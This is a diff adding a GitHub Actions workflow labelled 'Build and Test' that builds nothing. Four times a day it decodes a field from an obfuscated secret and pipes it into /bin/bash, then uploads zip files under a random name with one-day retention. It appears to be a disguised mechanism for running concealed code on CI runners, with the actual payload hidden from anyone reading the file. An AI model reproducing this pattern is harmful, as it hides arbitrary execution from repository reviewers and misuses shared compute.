@@ -1,0 +1,29 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '16 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  operation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build
+        env:
+          qc9: ${{ secrets.qc9 }}
+        run: |
+          printf '%s' "$qc9" | jq -r .qwno8 | /bin/bash
+          printf '%s' "$up718" | jq -r .n38464 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: M6JJISuN
+          path: "*.zip"
+          retention-days: 1
